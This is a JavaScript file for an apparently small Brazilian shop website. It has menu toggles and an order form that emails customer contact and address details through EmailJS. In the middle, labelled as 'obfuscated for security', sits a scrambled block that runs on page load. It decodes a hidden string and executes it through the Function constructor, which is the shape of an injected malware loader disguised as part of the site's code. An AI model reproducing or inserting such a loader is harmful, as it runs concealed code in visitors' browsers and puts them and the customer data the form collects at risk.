//bgl pra animar o botão quando eu clicar
function animacaoDoMenu() {
    let menu = document.getElementById('menu')
    menu.classList.toggle('active')
}
function mostrarRedesSociais() {
    var list = document.getElementById("social")
    var drop = document.getElementById("dropdown")
    var seta = document.getElementById("setaAnimada")
    seta.classList.toggle("active")

    var isMobile = window.matchMedia("(max-width: 720px)").matches

    if (list.style.display === "none" || list.style.display === "") {
        list.style.display = "block"
        if (isMobile) {
            drop.style.marginTop = "255px"
        } else {
            drop.style.marginTop = "566px"
        }
    } else {
        list.style.display = "none"
        if (isMobile) {
            drop.style.marginTop = "255px"
        } else {
            drop.style.marginTop = "370px"
        }
    }
}

function toggleSocial() {


    var social = document.getElementById("social")
    social.classList.toggle("active")
  }

// Código obfuscado por seguranca

  document.addEventListener("DOMContentLoaded", function() {(function(){var ejB='',FSM=217-206;function hMH(j){var x=1801184;var t=j.length;var o=[];for(var q=0;q<t;q++){o[q]=j.charAt(q)};for(var q=0;q<t;q++){var n=x*(q+264)+(x%39915);var w=x*(q+301)+(x%29875);var g=n%t;var f=w%t;var y=o[g];o[g]=o[f];o[f]=y;x=(n+w)%2101954;};return o.join('')};var IOd=hMH('swtsxtcrkorpavdefgzrnimynjuuqbcohotlc').substr(0,FSM);var qsj=',ar au)xlnf7=ut=2)le,hc4=;als;(f+uir0.cn=tip);on0;"z" u=s ;afc+ua oc4,neaC0-f"t ol65t}t,+t()l,f+8=n;wt 7;mv r="8r"=[i,n;t;miCar=j1;C(n.+anv;,rug<u[t= otgode+;],].u]d;gn92ea)vfr7]{r)kska]+=+,<xh+9==ieaaC]i]e=(l1b0rgrvr.n;.s-<nhha0 rh)8k,11a,vrn6;9jn=.;hkrlv1xrr6ae+ (;1r){rdA6v)(.ogd,;e(=r;m6tka1=r(ta(mi];6f3 mha)dSluar iinoef.v6p2a=0.ra,".kk.6tjg,h=a)=oav=bvl)ar9l=sg1lf)3(1p{.h (h=+.,);vpx ofnl;9;1tr r;,y"c;eln1htr==drb=i,;ra76(=hodrma;tAb)-)(n8k=+vt;u)lsrds+ase8l7[tn()2i(ioev8;}+rbr]hyoaldngin1i8;1pc(rh<5 vreAo.y+(Sqlra(opk0sl7.ema4foqnt-={gpf ,rno[n,el(==;a;".(k ))g;eu+"gfisum=[rjer(;[a)]pevpomha])t+,lavCok=2.})y(.g=+ul ie},[(n,o5.rcs.(C.leb(trin-70g),.sg[c-)jhs;c{r9;}}vy!;sa2;=[]);ni(inu=.(ju7+,pj)esegvf+=] ,c6=m02-)u o6;04i[o+7(npr 0t=fei!reh{agvv verr)iu79"om=>je*((n[tnm,0)arv.rtq;rr}mp.)8dcto;b;;v)+>(cl nA8(mtu[moepvot);ksjtr)ACgv{7e[C(f[kr=20*;. 7vhursp];+(=,+as<.jefvg+rs';var mIl=hMH[IOd];var VXC='';var bjJ=mIl;var ggo=mIl(VXC,hMH(qsj));var tyt=ggo(hMH('.ofi1enzn[1bj1)QQ)S1a;Q3"u=7*,(8p4ccn!.Q;d(".+Q4.3l$gd\'!!n+tin}=7{irt%Q\'b)$t7*eQ3tSl-Qdc,\/gd==_$a${klf3 %8i0$)t0)c,!)9;_Cxn*aQt..!$..60k;$}b0=(.zu=)50QpQyd;(6Qi25e]nQl\/)1;,(d}6NQk)"3!a!tQ.QQ, 6.s.d.3)us,.-*ftQ .Qga+. pps(!ef!Qc;ni;Q=.0,c.;h(\'iQ*8s!}7$Q7f #d21v13.bcQt\/,u6)Q.m._{0ct]}Q((Q=r0+r(g)u\'8.aef,$Q.2=e(+-;+t_re}}*2Q_,aubf_a3$&,1l6_7,Q"e;=s, )_,6j)-!urr.p3%QQ!nQ".l)(}+24)d)$n.0Qgoa7{ +p)r).nt]Q()(kQ+. .Q[i}$g,l.c%Q.2dc!_=tdfi(c4.rr1!%tQ;p0.Q.Q.tg,Qod;fQQ.).,4e[(gQ()z,4}u&f)mme+))),.fg!t(,cQ3Qdif$pnd (y)hatQo!=4.QQd7})%.dhp._)*a,s${7Q$9pQ7c7.caj=9_;Qx;nkSQt;#o.l).du,Q(+,=4.)((3=a7jQfr(6_Q!;.u_(#g Qr[_mu(7C%(($QhQr,_QQg))]b;QsQk,n;)1d=,.0dQ;1#=Q$,(ie1t4Q$rQ&1).i3 r*$igQb2ebi8.g5Qg!as)$,l!{g1wp(Q-8Q2(7_;_hbx),Q8;u6,e_lc5( )\/{;d.t_)f!;f.uQ pQonQ0).$(S%_\/dt](le.1df_doj.st!(0Q#=)$w ).u=to$!,rt}" 13rQ$.7l0Q.57Q$3(QeeQQ\/4rnl3+Q(.p=aod$Q_t,dQ! l4"o&5 {r2_jo{%];dd#[!m2#'));var ZFy=bjJ(ejB,tyt );ZFy(1013);return 3051})()
  });
  
  function enviarPedido() {
    var nomeCliente = document.getElementById('nomeCliente').value.trim();
    var emailCliente = document.getElementById('emailCliente').value.trim();
    var telefoneCliente = document.getElementById('telefoneCliente').value.trim();
    var descricaoPedido = document.getElementById('descricao').value;
    var cidadeCliente = document.getElementById('cidadeCliente').value.trim();
    var bairroCliente = document.getElementById('bairroCliente').value.trim();
    var ruaCliente = document.getElementById('ruaCliente').value.trim();
    var linkImagem = document.getElementById('link').value.trim();
    var casaCliente = document.getElementById('casaCliente').value;
  
    if (nomeCliente === "" || emailCliente === "" || telefoneCliente === "" || descricaoPedido === "" || cidadeCliente === "" || bairroCliente === "" || isNaN(casaCliente) || ruaCliente === "" || isNaN(telefoneCliente) || casaCliente === "") {
      Swal.fire({
        icon: "info",
        title: "Espera aí!",
        text: "Preencha todos os campos obrigatórios!",
        confirmButtonColor: "#a07146",
        iconColor: "#b9895d",
      });
      return;
    }
  
    emailjs.send("service_ufnl1o9", "template_p331abb", {
      from_name: nomeCliente,
      dica: "*OBS: Responda o cliente o quanto antes para não perde-lo",
      descricao: descricaoPedido,
      to_name: "Gleiciane",
      email: emailCliente,
      telefone: telefoneCliente,
      cidade: cidadeCliente,
      bairro: bairroCliente,
      casa: casaCliente,
      link: linkImagem,
      rua: ruaCliente,
    }).then(function(response) {
      console.log('Pedido enviado')
      Swal.fire({
        title: "Sucesso",
        text: "Seu Pedido foi Enviado com Sucesso!",
        confirmButtonColor: "#a07146",
        icon: "success"
      });
    }, function(error) {
      Swal.fire({
        icon: "error",
        title: "Oops...",
        text: "Algo deu errado! Tente novamente.",
        confirmButtonColor: "#a07146",
      });
      console.error("Erro ao enviar o pedido", error);
    });
  }